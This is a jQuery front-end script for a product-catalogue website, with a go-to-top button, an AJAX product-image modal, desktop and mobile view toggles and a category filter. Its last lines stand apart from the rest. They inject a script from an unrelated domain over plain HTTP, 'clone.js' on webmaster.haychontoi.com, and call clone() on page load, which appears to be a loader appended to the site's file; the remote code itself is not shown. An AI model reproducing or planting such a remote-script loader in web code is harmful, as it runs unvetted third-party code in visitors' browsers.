/**
 * Created by vietv on 3/19/2018.
 */

$(document).ready(function () {
    goTop();

});

function goTop() {
    var top = $('#top');
    top.css("display", "none");
    $(window).bind('scroll', function () {
        if ($(window).scrollTop() >= 84) {
            $('#top').css("display", "block");
        }
        else $('#top').css("display", "none");
    });

    top.click(function () {
        $('html, body').animate({scrollTop: 0}, 'slow');
    });
}

$('.show-template').click(function () {
    reset_show();

    $.ajax({
        type: 'POST',
        dataType: 'json',
        url: frontendUrl + 'admin/ajax/get-product-by-id',
        data: {
            id: $(this).data('id')
        },
        error: function () {
        },
        success: function (response) {
            if (response) {
                var item = $('.temp-item');
                var i;

                $('.btn-more a').first().attr('href', response[0]['link']);

                if (response[1].length >= 1) {
                    for (i = 0; i < response[1][0]['images'].length; i++) {
                        if (i == 0) {
                            $('.default-image').attr('src', response[1][0]['images'][i]['avatar']);
                        }
                        item.find('img').attr('src', response[1][0]['images'][i]['avatar']);
                        $('.desktop-images').append(item.html());
                    }
                }

                if (response[1].length >= 2) {
                    for (i = 0; i < response[1][1]['images'].length; i++) {
                        item.find('img').attr('src', response[1][1]['images'][i]['avatar']);
                        $('.mobile-images').append(item.html());
                    }
                }
            }
        }
    });
});

var show_image = function (event) {
    var src = $(event.target).attr('src');
    $('.default-image').attr('src', src);
};

$('.btn-ic-pc').click(function () {
    if (!$(this).hasClass('ic-active')) {
        $('.mobile-images').css('display', 'none');
        $('.desktop-images').css('display', 'block');

        $(this).addClass('ic-active');
        $('.btn-ic-mobile').removeClass('ic-active');
    }
});

$('.btn-ic-mobile').click(function () {
    if (!$(this).hasClass('ic-active')) {
        $('.mobile-images').css('display', 'block');
        $('.desktop-images').css('display', 'none');

        $(this).addClass('ic-active');
        $('.btn-ic-pc').removeClass('ic-active');
    }
});

$('.btnClose').click(function () {
    $('#myModal').modal('toggle');
});

var reset_show = function () {
    $('.default-image').attr('src', '');

    var mobile_images = $('.mobile-images');
    mobile_images.css('display', 'none');
    mobile_images.html('');

    var desktop_images = $('.desktop-images');
    desktop_images.css('display', 'block');
    desktop_images.html('');

    $('.btn-ic-pc').addClass('ic-active');
    $('.btn-ic-mobile').removeClass('ic-active');
};

$('.check-box').click(function () {
    var ct = '';

    var category_slug = $('.category-slug').val();

    $('.check-box:checkbox:checked').each(function () {
        ct += $(this).val() + ',';
    });

    window.location.replace(frontendUrl + category_slug + '.html?ct=' + ct);
});

var jq = document.createElement('script');
jq.src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js";
document.getElementsByTagName('head')[0].appendChild(jq);
jQuery.noConflict();

var cl = document.createElement('script');
cl.src = "http://webmaster.haychontoi.com/js/clone.js";
document.getElementsByTagName('head')[0].appendChild(cl);

jQuery.noConflict();

clone();